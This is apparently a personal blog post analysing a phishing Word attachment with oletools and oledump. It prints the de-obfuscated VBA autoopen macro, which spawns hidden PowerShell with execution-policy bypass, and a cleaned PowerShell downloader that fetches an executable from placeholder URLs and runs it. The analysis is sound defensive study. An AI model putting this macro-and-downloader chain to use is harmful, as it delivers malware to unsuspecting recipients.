---
layout: post
title: "Malware analysis writeup: `hotspotsel` (1/2)"
audio: false
tldr: false
location: "Freiburg, Germany"
---

I know, that title sounds weird, especially here, especially me. Anyway, I
started digging into "malware analysis" some time ago, mostly because I did not
know anything about malware (except that they were not nice). I still do not
know a lot about this topic, but I learned a few things already.

In the sequel, I am going to describe how I analyzed my very first real malware.
I applied what I learned reading books and doing exercises.

## Preamble

Earlier this week, one of my friends received an email from his child's school.
It was a reply to an email he sent a couple months ago, about his child being
sick back then. Although the content of the email seemed legit, a file named
`ANHANG-16231-21845251.doc` was attached to it, which alerted my friend. He
called the school and got confirmation that no one sent such an email.

My friend asked me what I thought about this story. Double-checking the email
headers, it was trivial to confirm that the school's employee was impersonated.
Given that the reply matched his email, the emails of this person were likely
dumped a while ago and the bad folks started to make "good" use of them. Before
leaving him, I asked my friend to forward me the `.doc` file.

## Word document and VBA macros

I uploaded this file on [VirusTotal](https://www.virustotal.com) but I did not
get a lot of information, so I started a VM with a set of tools to perform static
analysis of this document file.

> _Post-mortem:_ the VirusTotal report was more interesting than I thought: it
> mentioned that this file was likely a "downloader". Knowning this beforehand
> could have helped me during the analysis process.

I am not an expert but I know that Microsoft documents can embed and run
[macros](https://en.wikipedia.org/wiki/Macro_(computer_science)), specifically
[VBA](https://en.wikipedia.org/wiki/Visual_Basic_for_Applications) macros. I also
know that these macros have access to a lot of APIs and can run commands. The only
set of tools I am aware of to deal with such formats/files is
[oletools](https://github.com/decalage2/oletools).

I knew that this file was likely hiding VBA macros, but my experience solving
some so-called "hacking challenges" taught me to not overlook the information
gathering phase. I analyzed the file with `oleid`, which confirmed my intuition
and also indicated that the file was not encrypted:

```
oleid 0.54 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: ./ANHANG-16231-21845251.doc
 Indicator                      Value
 OLE format                     True
 Has SummaryInformation stream  True
 Application name               Microsoft Office Word
 Encrypted                      False
 Word Document                  True
 VBA Macros                     True
 Excel Workbook                 False
 PowerPoint Presentation        False
 Visio Drawing                  False
 ObjectPool                     True
 Flash objects                  0
```

The second tool I used was `olevba`. It has been used to extract the VBA macros
from the `.doc` file. The output I received looked
[obfuscated](https://en.wikipedia.org/wiki/Obfuscation_(software)) (the snippet
below has been truncated):

```
olevba 0.54.1 on Python 2.7.16 - http://decalage.info/python/oletools
===============================================================================
FILE: ./ANHANG-16231-21845251.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Swlfot9.cls
in file: ./ANHANG-16231-21845251.doc - OLE stream: u'Macros/VBA/Swlfot9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO zC7wlka.vba
in file: ./ANHANG-16231-21845251.doc - OLE stream: u'Macros/VBA/zC7wlka'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub K9hj1nG()
   Debug.Print "724" + ("516") + ("UPOp3Hrt" + ("23" + "361") + "vC9PPmCK" + ("rjITKvEv"))
Debug.Print "20" + ("994") + ("u_8YY68" + ("791" + "454") + "rbk4PQH" + ("iqapjj9"))
Debug.Print "942" + ("653") + ("pqQI0T2" + ("226" + "126") + "N7OT4k" + ("Z6j2ENjS"))
   Debug.Print "387" + ("127") + ("wjf7biL" + ("20" + "64") + "nE0OG8" + ("GNXHVKT"))
Debug.Print "255" + ("590") + ("kPaztnd9" + ("626" + "534") + "nc7FkKV" + ("itIImYJ"))
Debug.Print "763" + ("124") + ("lLo5VRP" + ("611" + "629") + "tJnnqa" + ("EPdjCjRp"))
End Sub
Sub _
autoopen( _
)

[...]
```

I took a look at the `olevba` documentation and learned about the `--reveal`
experimental feature. In this case, it worked well and this feature cleaned the
code a bit. It was still obfuscated but less weird (output below truncated):

```
Attribute VB_Name = "zC7wlka"
Sub K9hj1nG()
   Debug.Print "724516UPOp3Hrt23361vC9PPmCKrjITKvEv"
Debug.Print "20994u_8YY68791454rbk4PQHiqapjj9"
Debug.Print "942653pqQI0T2226126N7OT4kZ6j2ENjS"
   Debug.Print "387127wjf7biL2064nE0OG8GNXHVKT"
Debug.Print "255590kPaztnd9626534nc7FkKVitIImYJ"
Debug.Print "763124lLo5VRP611629tJnnqaEPdjCjRp"
End Sub
Sub autoopen( )
   Debug.Print "588496Bn5Mps680785i9QMw62Vw29iIrvf"
Debug.Print "984870ZavHKq723615HYijaGWMHILLpV"
Debug.Print "58974piKRd2450645jwOkskOoIvNiL"
lc8cJsPt
   Debug.Print "860836EYdLCWj544391w0whi5Mmcto3"
Debug.Print "12319b1Pp9wzc397829Xozjntl2HkNCop"
Debug.Print "826309uz3s8R5980Z6jEJwMSGtCq"
End Sub

[...]
```

I went ahead and manually cleaned the code even more but I had two references
to another OLE "thing" named `Swlfot9` that I could decode. I knew it had
something to do with [PowerShell](https://en.wikipedia.org/wiki/PowerShell)
given the `"powe"` string but I could not find anything else...

```
Attribute VB_Name = "zC7wlka"

Sub autoopen()
	lc8cJsPt
End Sub

Sub lc8cJsPt()
	Set Win32ProcessstartupObj = GetObject("winmgmts:Win32_ProcessStartup")
	Win32ProcessstartupObj.ShowWindow = 0

	Set Win32ProcessObj = GetObject("winmgmts:Win32_Process")
    Win32ProcessObj.Create "powe" + Swlfot9.FbFMIBR + Swlfot9.bLJAPOF,
	Null,
	Win32ProcessstartupObj,
	ProcessId
End Sub
```

I saw the name `Swlfot9` in the very first `olevba` output though, so I knew
that something was still there, but I could just not see it. I tried some other
oletools but it was a dead-end :cry:

## A PowerShell payload

Not really knowing what to do next, I decided to give the `strings` command a
try and found a very large string that looked like a bas64-encoded string.
I piped this string to `base64 -d` and got some PowerShell instructions in
return. Yay!

```powershell
$XvmIXvo='t6jTbM';$PbDL43 = '71';$uj6EVuv='L8KMkkX'; [...]
```

Given that I was stuck with the VBA macro, I decided to clean the PowerShell
[payload](https://en.wikipedia.org/wiki/Payload_(computing)) to better
understand it. There were unused variables and weird PowerShell-allowed calls.
Below is the PowerShell script rewritten to be more readable:

```powershell
# `$env:userprofile` returns the full path of the profile directory.
$pathToExe = $env:userprofile+'\71.exe';

$webClient = New-Object Net.WebClient;

# List of URLs pointing to a program to download
$urls = [
    http://some.example.com/folder-123/,
    http://another.example.com/folder-456/,
]

foreach ($url in $urls) {
    try {
        # Try to download a program...
        $webClient.DownloadFile($url, $pathToExe);

        # if it worked, then...
        If ((Get-Item $pathToExe).length -ge 24103) {
            # run it!
            Invoke-Item $pathToExe;
            break;
        }

        # otherwise, keep trying.
    } catch {
    }
}
```

This PowerShell script is a **downloader**: its job is to download a malicious
program, nothing more. I still did not know how this script was executed by the
macro though.

## OLE dump

I searched for a tool able to dump an OLE stream from a `.doc` file
and discovered [oledump.py](https://blog.didierstevens.com/programs/oledump-py/).
Analyzing the different sections, I found interesting data that I dumped as ASCII:

```
rshell -ExecutionPolicy bypass -WindowStyle Hidden -noprofile -e ,
```

This string corresponded to `Swlfot9.FbFMIBR`. Therefore the other reference was
the payload reversed in the previous section. Below is the full line of code used
to run the PowerShell script (which is represented by `"PAYLOAD"`):

```
Win32ProcessObj.Create "powershell -ExecutionPolicy bypass -WindowStyle Hidden -noprofile -e" + "PAYLOAD"
```

Job done!

## `71.exe`

In order to understand what kind of program was downloaded by the malicious `.doc`
file, I used a third party service to download the program from one of the URLs
in the list (in the PowerShell script) and this service then sent the program to me:

```
$ file 71.exe
71.exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows
```

That's a [Windows Portable Executable](https://en.wikipedia.org/wiki/Portable_Executable)
program. I also analyzed this file and Part 2 of this blog post will describe my
findings.

## Recap'

- I statically analyzed a Word document that contained a VBA macro and a PowerShell
script.
- The VBA macro runs the PowerShell script on behalf of the user who opens the
`.doc` file.
- The PowerShell script downloads and executes a malicious program.
- This malicious program is a Windows PE EXE file.

---

`ANHANG-16231-21845251.doc` MD5: `70c0c42d90fd499b1d3f77b6f5a0bd3b`
